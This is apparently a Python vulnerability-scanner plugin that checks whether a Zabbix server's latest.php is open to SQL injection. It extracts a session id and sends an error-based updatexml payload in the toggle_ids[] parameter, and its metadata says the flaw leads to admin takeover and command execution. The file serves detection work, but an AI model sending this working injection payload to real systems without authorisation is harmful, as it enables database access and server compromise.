# coding:utf-8
import re
import urllib2


def get_plugin_info():
    plugin_info = {
        "name": "Zabbix latest SQL注入",
        "info": "攻击者通过此漏洞可获取管理员权限登陆后台，后台存在执行命令功能，导致服务器被入侵控制。",
        "level": "高危",
        "type": "SQL注入",
        "author": "wolf@YSRC",
        "url": "https://github.com/Medicean/VulApps/tree/master/z/zabbix/2",
        "keyword": "tag:zabbix",
        "source": 1
    }
    return plugin_info


def check(ip, port, timeout):
    try:
        url = "http://" + ip + ":" + str(port)
        opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
        request = opener.open(url + "/dashboard.php", timeout=timeout)
        res_html = request.read()
    except:
        return
    if 'href="slides.php?sid=' in res_html:
        m = re.search(r'href="slides\.php\?sid=(.+?)">', res_html, re.M | re.I)
        if m:
            sid = m.group(1)
            payload = "/latest.php?output=ajax&sid={sid}&favobj=toggle&toggle_open_state=1&toggle_ids[]=(select%20updatexml(1,concat(0x7e,(SELECT%20md5(666)),0x7e),1))".format(
                sid=sid)
            res_html = opener.open(url + payload, timeout=timeout).read()
            if 'fae0b27c451c728867a567e8c1bb4e5' in res_html:
                return u"存在SQL注入，POC：" + payload
